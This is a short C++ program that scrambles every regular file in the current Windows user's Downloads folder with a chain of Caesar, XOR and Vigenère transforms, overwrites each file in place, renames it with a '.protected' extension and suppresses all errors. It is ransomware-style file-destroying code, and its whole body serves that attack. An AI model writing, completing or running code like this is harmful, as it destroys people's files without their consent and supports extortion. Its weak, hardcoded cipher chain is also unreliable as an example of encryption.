#include <dirent.h>
#include <sys/stat.h>
#include <fstream>
#include <string>
#include <vector>

// Caesar cipher encryption
char caesarEncrypt(char c, int shift) {
    if (isalpha(c)) {
        char base = islower(c) ? 'a' : 'A';
        return (c - base + shift) % 26 + base;
    }
    return c;
}

// XOR encryption
char xorEncrypt(char c, char key) {
    return c ^ key;
}

// Vigenère cipher encryption
char vigenereEncrypt(char c, char key) {
    if (isalpha(c)) {
        char base = islower(c) ? 'a' : 'A';
        return (c - base + (tolower(key) - 'a')) % 26 + base;
    }
    return c;
}

// Combine all encryption methods
char encryptChar(char c, int caesarShift, char xorKey, char vigenereKey) {
    c = caesarEncrypt(c, caesarShift);
    c = xorEncrypt(c, xorKey);
    c = vigenereEncrypt(c, vigenereKey);
    return c;
}

// Encrypt the content of a file
std::string encryptContent(const std::string& content, const std::string& vigenereKey) {
    std::string encrypted;
    int caesarShift = 3;  // Example Caesar cipher shift
    char xorKey = 'X';    // Example XOR key
    for (size_t i = 0; i < content.size(); ++i) {
        char vKey = vigenereKey[i % vigenereKey.size()];
        encrypted += encryptChar(content[i], caesarShift, xorKey, vKey);
    }
    return encrypted;
}

// Encrypt all files in the Downloads directory
void encryptFilesInDownloads() {
    const char* userProfile = std::getenv("USERPROFILE");
    if (!userProfile) return;

    std::string downloadsPath = std::string(userProfile) + "\\Downloads";
    DIR* dir = opendir(downloadsPath.c_str());
    if (!dir) return;

    std::string vigenereKey = "magicspell";

    struct dirent* entry;
    while ((entry = readdir(dir)) != nullptr) {
        std::string filePath = downloadsPath + "\\" + entry->d_name;

        struct stat fileStat;
        if (stat(filePath.c_str(), &fileStat) == 0 && S_ISREG(fileStat.st_mode)) {
            try {
                // Read file content
                std::ifstream inputFile(filePath, std::ios::binary);
                std::ostringstream buffer;
                buffer << inputFile.rdbuf();
                std::string content = buffer.str();
                inputFile.close();

                // Encrypt content
                std::string encryptedContent = encryptContent(content, vigenereKey);

                // Write encrypted content to the same file
                std::ofstream outputFile(filePath, std::ios::binary);
                outputFile << encryptedContent;
                outputFile.close();

                // Rename the file
                std::string newFilePath = filePath + ".protected";
                rename(filePath.c_str(), newFilePath.c_str());

            } catch (const std::exception&) {
                // Suppress all exceptions
            }
        }
    }
    closedir(dir);
}

int main() {
    encryptFilesInDownloads();
    return 0;
}
